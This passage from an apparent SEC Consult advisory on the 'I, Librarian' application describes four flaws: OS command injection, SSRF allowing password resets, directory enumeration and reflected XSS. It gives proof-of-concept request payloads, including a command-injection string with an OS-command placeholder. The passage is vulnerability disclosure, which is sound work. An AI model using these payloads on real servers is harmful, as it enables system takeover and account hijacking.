Business recommendation:
------------------------
By combining the vulnerabilities documented in this advisory an attacker can
fully compromise the web server which has the "I, Librarian" software installed.

SEC Consult recommends to install the latest version available immediately and
perform a thorough security review of this software.


Vulnerability overview/description:
-----------------------------------
The application doesn&#039;t apply proper validation on some user inputs. As a
result, below vulnerabilities can be exploited by authenticated attackers with
any roles to fully compromise the system.

1. OS Command Injection
Arbitrary OS commands are possible to be executed from "batchimport.php". This
is a serious vulnerability as the chances for the web server to be fully
compromised are very high.

2. Server-Side Request Forgery
This vulnerability allows an attacker to send HTTP requests originating from the
web server. As some functions in the web application require requests to
be done from localhost, the risk for this vulnerability is considered high.

3. Directory Enumeration
It is possible to enumerate all directories in any directory on the server through
"jqueryFileTree.php".

4. Reflected Cross Site Scripting
This vulnerability was found in "temp.php". It allows an attacker to inject
malicious client side scripting which will be executed in the browser of users
if they visit the manipulated site.


Proof of concept:
-----------------
1. OS Command Injection
Below is the detail of a HTTP request that needs to be sent to execute arbitrary
OS commands through "batchimport.php":

URL     : http://$DOMAIN/batchimport.php
METHOD  : GET
PAYLOAD : directory=.&commence=&user="||<os-commands-here>||"


2. Server-Side Request Forgery
Below shows an example of the exploitation for this vulnerability. An attacker
can reset any user&#039;s password which by design requires the request to be sent
from localhost.

URL     : http://$DOMAIN/ajaxsupplement.php
METHOD  : POST
PAYLOAD :
form_new_file_link=http://$DOMAIN/resetpassword.php?username=<username>&new_password1=<new-password>&new_password2=<new-password>


3. Directory Enumeration
Available directories can be enumerated simply by navigating through the "dir"
parameter in "jqueryFileTree.php".

URL     : http://$DOMAIN/jqueryFileTree.php
METHOD  : POST
PAYLOAD : dir=<path-to-directory>


4. Reflected Cross Site Scripting
The following payload shows a simple alert message box:
URL     : http://$DOMAIN/temp.php
METHOD  : GET
PAYLOAD : tempfile=<script>alert(42)</script>


Vulnerable / tested versions:

at the time the security vulnerabilities were discovered. It is assumed
